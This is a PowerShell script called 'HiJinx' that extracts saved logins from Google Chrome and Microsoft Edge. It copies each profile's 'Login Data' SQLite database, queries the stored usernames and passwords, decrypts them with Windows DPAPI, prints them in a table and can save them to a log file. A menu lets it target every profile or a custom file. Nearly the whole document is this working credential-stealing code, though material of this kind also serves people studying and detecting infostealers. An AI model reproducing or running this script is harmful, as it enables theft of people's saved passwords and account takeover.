<# Barclay McClay - 2022 - 0.1 #>

############ DECLARE SOME STTUFF
Try{
Add-Type -AssemblyName System.Security 									#We need this .NET class to do the cryptography stuff
}Catch{
	Write-Host @"
_____________FATAL ERROR_______________
.NET System.Security Assembly Failed!
"@ -ForegroundColor Red -BackgroundColor Black
	Write-Host "Press enter to exit" -ForegroundColor Yellow
	Read-Host
	exit
}
$parentFolder = $MyInvocation.MyCommand.Path | Split-Path -Parent 		#path this script is being launched from
$sqliteLibraryPath = $parentFolder+"\System.Data.SQLite.dll" 			#path to dll SQLite assembly
Unblock-File $sqliteLibraryPath 										#unblock dll file, as it is downloaded from the internet- we don't want remote-signed permissions throwing security errors
Try{
	[System.Reflection.Assembly]::LoadFrom($sqliteLibraryPath) | Out-Null #load dll file (quietly)
}Catch{
	Write-Host @"
_____________FATAL ERROR_______________
SQLite mixed-mode assembly not present
You are missing:
$($sqliteLibraryPath)
Or the file is otherwise unsuitable/corrupt/access is denied.
"@ -ForegroundColor Red -BackgroundColor Black
	Write-Host "Press enter to exit" -ForegroundColor Yellow
	Read-Host
	exit
}
<#
Write-Host @"
                                  _||||||_
                                _|||'""'||\
                              _|||/  .''".|\
                            _||||/   |    \|_
                           /|||||    \    /  \
                         _|||||||     '.  \ _ /
                        /||||||||       \
             __.---._  /|||||||||        |   _.---.__
           .||/      '.||||||||||         |'      \||_
         .|||/         '|||||||||.._    .'         \|||.
        /|||||          _|-"'       '"-|_          |||||\
       |||||||.---.   .'  __.-"'''"-.__  '.   .---.|||||||
       |||||||     '\/  .'/__\     /__\'.  \/'     |||||||
       |||||||       |_/ //  \\   //  \\ \_|       |||||||
       |||||||       |/ |/  /\|| ||/\  \| \|       |||||||
        \|||||    __ || _  .^.\| |/.^.  _ || __    |||||/
         \||||   / _\|/ = /_o_\   /_o_\ = \|/_ \   ||||/
          \||/   |'.-     \   /   \   /     -.'|   \||/
         _||'    \ |    _  \ /  _  \ /    _    | /    '||_
        /  \      \\_  ( '--V(     )V--' )  _//      /. \
        \ _/       \_/|  /_   \___/   _\  |\_/       \_\/
                      | /|\\  \   /  //|\ |
                      |  | \'._'-'_.'/ |  |
                      |  |  '-.'''.-'  |  |
                      |   \    '''    /   |
    __                |    '.-=====-.'    |                __
   /  \_         __..--\     '-----'     /--..__         _/ /\
   \__/\'''---'''..||||.'.___       ___.'_||||..'''---'''/\'_/
        '-.__''|||||||||||__'._   _.'__|||||||||||''__.-'
             ''''--| ||||||||..'"'..|||||||| |--''''   _
        .-.       /_|||||||'|||||||||'|||||||_\    _.-' '\
      .'  /_     /_||||||'/| ||||||| |\'||||||_\  '\     '-'|
     /      )   /_|||||'_' | ||||||| | '_'|||||_\   \   .'-./
     ''-..-'   /_||||'_'   | ||||||| |   '_'||||_\   '"'
              | |||'_'     | ||||||| |  _  '_ |||'|
             _\__.-'  .-.  | ||||||| |  |'-. '-.__/_
            /  \     (   )  \'|||||'/   |   |    /  \
            \ _/   ('     ') \'|||'/    '-._|    \__/
                    '-/ \-'   '._.'         '
                      ---      /  \
                               \ _/
"@ -ForegroundColor DarkRed -BackgroundColor Black #>
Write-Host "------------------------------------------------------------" -ForegroundColor DarkYellow -BackgroundColor Black
Write-Host @"
 ▄█    █▄     ▄█        ▄█  ▄█  ███▄▄▄▄   ▀████    ▐████▀ 
 ███    ███   ███       ███ ███  ███▀▀▀██▄   ███▌   ████▀  
 ███    ███   ███▌      ███ ███▌ ███   ███    ███  ▐███    
▄███▄▄▄▄███▄▄ ███▌      ███ ███▌ ███   ███    ▀███▄███▀
▀▀███▀▀▀▀███▀  ███▌     ███ ███▌ ███   ███    ████▀██▄     
  ███    ███   ███      ███ ███  ███   ███   ▐███  ▀███    
  ███    ███   ███      ███ ███  ███   ███  ▄███     ███▄  
  ███    █▀    █▀   █▄ ▄███ █▀    ▀█   █▀  ████       ███▄ 
                    ▀▀▀▀▀▀
"@ -ForegroundColor DarkYellow -BackgroundColor Red
Write-Host "------------------------------------------------------------`n" -ForegroundColor DarkRed -BackgroundColor Black

#########################################################################################################################################################

function HijinxCloneLoginData ($path) {
	#Clone the Login data file and then return the path of the cloned data
	$clone=$path+'_'
	Copy-Item $path -Destination $clone -Force -Confirm:$false
	return $clone
}

function HijinxReadData {
	Write-Host "$($profilePath):" -ForegroundColor Yellow
	#do Database stuff to pull info out of the Login data file
	$SQLData = New-Object System.Data.DataSet
	$SQLQuery = "SELECT origin_url,action_url,username_value,password_value,signon_realm  FROM logins" #This is the SQL query we will run on the Login data file using the loaded dll
	$dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($SQLQuery,"Data Source=$LDfile")
	$dataAdapter.Fill($SQLData) | Out-Null
	#Make a powershell array of the data
	$encryptedArray=$SQLData.Tables[0] | Select-Object signon_realm, username_value, password_value #we're making a powershell array of the stuff we've pulled from this database
	foreach ($item in $encryptedArray) {  #'password_value' taken from the database needs to be decrypted
	$password = "" #clear this var
		Try{
			#This is where the magic happens; first we use .NET to decrypt the passwords passed to this function from the database
			$decryptedPass=[System.Security.Cryptography.ProtectedData]::Unprotect($item.password_value, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine) 
			foreach ($char in $decryptedPass) { #We have each password decrypted from the database and stored as a decimal ascii value
				$password+=[Convert]::ToChar($char) #.NET then converts each ascii charater to a readable string
			}
			$item.password_value = $password #return the password as a human-readable string
		}Catch{
			#This process isnt reliable for ALL the passwords. 
			#From what I can tell, this method is only capable of decrypting *older* Chromium passwords.
			#It can retrieve login data; but will display the encrypted password instead of the plaintext version.
			#Such passwords end up in the pipe in this Catch block here.
		}
	}	
	return $encryptedArray | Format-Table -AutoSize signon_realm, username_value, password_value #Display the array
}
#########################################################################################################################################################

#														START OF MAIN MENU
#========================================================================================================================================================

Do{
	Write-Host "	-	MAIN MENU	-	" -ForegroundColor Red
	Write-Host @"
[1.] Chrome
[2.] Edge
[3.] All
[4.] Custom
[Q.] Quit
"@ -ForegroundColor Yellow
	$mm = Read-Host
	switch($mm) {
			1 {
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Red
				Write-Host "HiJinxing Google Chrome..." -ForegroundColor Blue
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Green
				#Default Chrome profile
				$browserPath = 'Google\Chrome\User Data'
				$profilePath = 'Default'
				$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
				$HiJinxedProfile = HijinxReadData
				$log += "$($profilePath):`n"
				$log += $HiJinxedProfile
				$HiJinxedProfile
				#additional profiles
				$profileList = Get-ChildItem -Path "$($env:LOCALAPPDATA)\$($browserPath)\" | Select-Object Name | Where-Object name -like "*Profile *"		
				Write-Host "$($profileList.count) other Chrome Profiles detected..." -ForegroundColor Yellow
				$i = 0
				Do{
					$profilePath = "$($profileList[$i].Name)"
					$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
					$HiJinxedProfile = HijinxReadData
					$log += "$($profilePath):`n"
					$log += $HiJinxedProfile
					$HiJinxedProfile
					$i++
				}Until($i -ge $profileList.count)
				Break
			}
			2 {
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Blue -BackgroundColor DarkBlue
				Write-Host "HiJinxing Microsoft Edge..." -ForegroundColor Cyan -BackgroundColor DarkBlue
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Blue -BackgroundColor DarkBlue
				$browserPath = 'Microsoft\Edge\User Data'
				$profilePath = 'Default'
				$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
				$HiJinxedProfile = HijinxReadData
				$log += "$($profilePath):`n"
				$log += $HiJinxedProfile
				$HiJinxedProfile
				#additional profiles
				$profileList = Get-ChildItem -Path "$($env:LOCALAPPDATA)\$($browserPath)\" | Select-Object Name | Where-Object name -like "*Profile *"		
				Write-Host "$($profileList.count) other Edge Profiles detected..." -ForegroundColor Yellow
				if($profileList.count -gt 0){
					$i = 0
					Do{
						$profilePath = "$($profileList[$i].Name)"
						$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
						$HiJinxedProfile = HijinxReadData
						$log += "$($profilePath):`n"
						$log += $HiJinxedProfile
						$HiJinxedProfile
						$i++
					}Until($i -ge $profileList.count)
				}
				Break
			}
			3 {
				Write-Host "You have selected..." -ForegroundColor Yellow
				Write-Host @"
*   +    ++      *   + +   *      ++    +   *
...::: THE TOTAL HIJINX SPECIAL BONANZA :::...
*   +    ++      *   + +   *      ++    +   *
"@ -ForegroundColor Yellow -BackgroundColor DarkRed
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Red
				Write-Host "HiJinxing Google Chrome..." -ForegroundColor Blue
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Green
				#Default Chrome profile
				$browserPath = 'Google\Chrome\User Data'
				$profilePath = 'Default'
				$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
				$HiJinxedProfile = HijinxReadData
				$log += "$($profilePath):`n"
				$log += $HiJinxedProfile
				$HiJinxedProfile
				#additional profiles
				$profileList = Get-ChildItem -Path "$($env:LOCALAPPDATA)\$($browserPath)\" | Select-Object Name | Where-Object name -like "*Profile *"		
				Write-Host "$($profileList.count) other Chrome Profiles detected..." -ForegroundColor Yellow
				$i = 0
				Do{
					$profilePath = "$($profileList[$i].Name)"
					$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
					$HiJinxedProfile = HijinxReadData
					$log += "$($profilePath):`n"
					$log += $HiJinxedProfile
					$HiJinxedProfile
					$i++
				}Until($i -ge $profileList.count)
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Blue -BackgroundColor DarkBlue
				Write-Host "HiJinxing Microsoft Edge..." -ForegroundColor Cyan -BackgroundColor DarkBlue
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Blue -BackgroundColor DarkBlue
				#default Edge
				$browserPath = 'Microsoft\Edge\User Data'
				$profilePath = 'Default'
				$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
				$HiJinxedProfile = HijinxReadData
				$log += "$($profilePath):`n"
				$log += $HiJinxedProfile
				$HiJinxedProfile
				#additional profiles
				$profileList = Get-ChildItem -Path "$($env:LOCALAPPDATA)\$($browserPath)\" | Select-Object Name | Where-Object name -like "*Profile *"		
				Write-Host "$($profileList.count) other Edge Profiles detected..." -ForegroundColor Yellow
				if($profileList.count -gt 0){
					$i = 0
					Do{
						$profilePath = "$($profileList[$i].Name)"
						$LDfile = HijinxCloneLoginData -path "$($env:LOCALAPPDATA)\$($browserPath)\$($profilePath)\Login Data" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
						$HiJinxedProfile = HijinxReadData
						$log += "$($profilePath):`n"
						$log += $HiJinxedProfile
						$HiJinxedProfile
						$i++
	 				}Until($i -ge $profileList.count)
				}
				Break
			}
			4 {
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Blue -BackgroundColor DarkBlue
				Write-Host "HiJinxing something you prepared earlier..." -ForegroundColor Cyan -BackgroundColor DarkBlue
				Write-Host "*   +    ++      *   + +   *      ++    +   *" -ForegroundColor Blue -BackgroundColor DarkBlue
				$browserPath = 'Custom'
				$profilePath = 'Custom'
				$LDfile = Read-Host -Prompt "Input the full filepath of the Chromium Login Data you want to HiJinx`n" #path to Default profile's "Login Data" file (encrypted database of username/password combos stored by Chrome)
				$HiJinxedProfile = HijinxReadData
				$log += "$($profilePath):`n"
				$log += $HiJinxedProfile
				$HiJinxedProfile
				Break
			}
			"q" {
				exit
			}
			Default{
				Write-Host "Input the number of an option above, or 'q' to Quit." -ForegroundColor Red
				Break
			}
		}

		Write-Host "Write this to a log file?" -ForegroundColor Yellow
		$lm = Read-Host -Prompt "[y/n]"
		if($lm -eq "y"){
			$log > "$($parentFolder)\HiJinx_Log.txt"
			Write-Host "Written to $($parentFolder)\HiJinx_Log.txt" -ForegroundColor Yellow
		}

}Until($mm -eq "q")
Try{
Remove-Item $LDfile
}Catch{
Write-Host "Heads up! could not remove`n$($LDFile)" -ForegroundColor Red
}
#														END OF MAIN MENU
#========================================================================================================================================================

###############################################################################################################################################
#																																			  #
#																THE END																		  #
#																																			  #
###############################################################################################################################################>